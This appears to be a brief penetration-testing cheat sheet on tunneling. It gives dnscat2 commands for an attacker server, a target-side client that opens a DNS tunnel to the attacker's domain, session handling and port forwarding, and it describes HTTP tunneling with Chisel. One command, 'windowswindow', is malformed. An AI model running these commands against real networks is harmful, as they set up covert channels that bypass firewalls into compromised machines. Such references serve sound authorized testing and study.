# Tunneling

## DNS Tunneling

| **Command** | **Description** |
| --- | --- |
| `dnscat2-server <fake-domain-name>` | **Attacker**: Starts the dnscat2 server and listens for DNS connections via the fake domain.

Will output a secret to stdout, prevents MITM tampering. |
| `./dnscat2 --secret=<secret> <fake-domain-name>` | **Target**: Starts the dnscat2 client on the target, initiating a DNS tunnel to the attacker’s server.

Need to bring dnscat2 to the target. |
| `windowswindow -i <session-id>` | Lists active `dnscat2` sessions and lets the attacker interact with a specific session. |
| `listen <lhost>:<lport> <rhost>:<rport>` | Sets up local port forwarding through the DNS tunnel, from the attacker’s machine to the target. |

## **HTTP Tunneling**

HTTP tunneling is a technique used to transmit network traffic through the HTTP protocol, often to bypass network restrictions or firewalls that block non-HTTP traffic.

It works by encapsulating non-HTTP data (such as TCP or other protocol traffic) within HTTP requests and responses, allowing communication between a client and server even when direct access is restricted.

The [Chisel](https://github.com/jpillora/chisel) tool, besides being a useful pivoting tool, also encapsulates traffic in HTTP, allowing it to be used effectively for tunneling through restrictive network environments.